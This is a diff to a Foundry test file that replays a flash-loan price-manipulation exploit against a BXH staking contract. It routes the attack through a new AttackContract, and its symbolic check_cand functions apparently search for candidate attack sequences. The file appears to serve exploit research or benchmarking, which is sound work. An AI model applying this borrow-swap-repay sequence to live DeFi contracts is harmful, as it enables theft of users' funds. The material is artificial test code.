@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import "./AttackContract.sol";
 import "./BXH.sol";
 import "./BXHStaking.sol";
 import "@utils/QueryBlockchain.sol";
@@ -16,14 +17,16 @@ contract BXHTest is Test, BlockLoader {
     UniswapV2Factory factory;
     UniswapV2Router router;
     BXHStaking bxhstaking;
+    AttackContract attackContract;
+    address owner;
     address attacker;
-    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
     address bxhAddr;
     address usdtAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
     address bxhstakingAddr;
+    address attackContractAddr;
     uint256 blockTimestamp = 1664374995;
     uint112 reserve0pair = 25147468936549224419158;
     uint112 reserve1pair = 150042582869434191452532;
@@ -43,9 +46,7 @@ contract BXHTest is Test, BlockLoader {
     uint256 balanceOfusdtbxhstaking = 40030764994324038311630;
 
     function setUp() public {
-        vm.warp(blockTimestamp);
-        attacker = address(this);
-        vm.startPrank(owner);
+        owner = address(this);
         bxh = new BXH();
         bxhAddr = address(bxh);
         usdt = new USDT();
@@ -78,6 +79,9 @@ contract BXHTest is Test, BlockLoader {
             owner
         );
         bxhstakingAddr = address(bxhstaking);
+        attackContract = new AttackContract();
+        attackContractAddr = address(attackContract);
+        attacker = address(attackContract);
         bxh.transfer(address(bxhstaking), 200000 ether);
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
@@ -85,7 +89,6 @@ contract BXHTest is Test, BlockLoader {
         usdt.transfer(address(bxhstaking), balanceOfusdtbxhstaking);
         usdt.approve(attacker, UINT256_MAX);
         bxh.approve(attacker, UINT256_MAX);
-        vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
@@ -122,9 +125,17 @@ contract BXHTest is Test, BlockLoader {
             bxh.decimals()
         );
         emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(usdt), attacker, usdt.decimals());
-        queryERC20BalanceDecimals(address(bxh), attacker, bxh.decimals());
+        emit log_string("Attackcontract Balances: ");
+        queryERC20BalanceDecimals(
+            address(usdt),
+            address(attackContract),
+            usdt.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(bxh),
+            address(attackContract),
+            bxh.decimals()
+        );
         emit log_string("");
         emit log_string("");
         emit log_string("");
@@ -191,6 +202,7 @@ contract BXHTest is Test, BlockLoader {
     }
 
     function test_gt() public {
+        vm.startPrank(attacker);
         borrow_usdt(2500000e18);
         printBalance("After step0 ");
         swap_pair_usdt_bxh(usdt.balanceOf(attacker));
@@ -202,6 +214,7 @@ contract BXHTest is Test, BlockLoader {
         payback_usdt((2500000e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
+        vm.stopPrank();
     }
 
     function check_gt(
@@ -211,6 +224,7 @@ contract BXHTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_bxh(amt1);
@@ -218,6 +232,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_bxh_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand000(
@@ -227,6 +242,7 @@ contract BXHTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_bxh(amt1);
@@ -234,6 +250,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_bxh_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand001(
@@ -243,6 +260,7 @@ contract BXHTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_bxh(amt0);
         swap_pair_bxh_usdt(amt1);
@@ -250,6 +268,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_usdt_bxh(amt3);
         payback_bxh(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand002(
@@ -260,6 +279,7 @@ contract BXHTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_bxh(amt1);
@@ -268,6 +288,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_bxh_usdt(amt4);
         payback_usdt(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand003(
@@ -278,6 +299,7 @@ contract BXHTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_bxh(amt0);
         swap_pair_bxh_usdt(amt1);
@@ -286,6 +308,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_usdt_bxh(amt4);
         payback_bxh(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand004(
@@ -296,6 +319,7 @@ contract BXHTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_bxh(amt0);
         swap_pair_bxh_usdt(amt1);
@@ -304,6 +328,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_bxh_usdt(amt4);
         payback_bxh(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand005(
@@ -315,6 +340,7 @@ contract BXHTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_bxh(amt0);
         swap_pair_bxh_usdt(amt1);
@@ -324,5 +350,6 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_usdt_bxh(amt5);
         payback_bxh(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 }
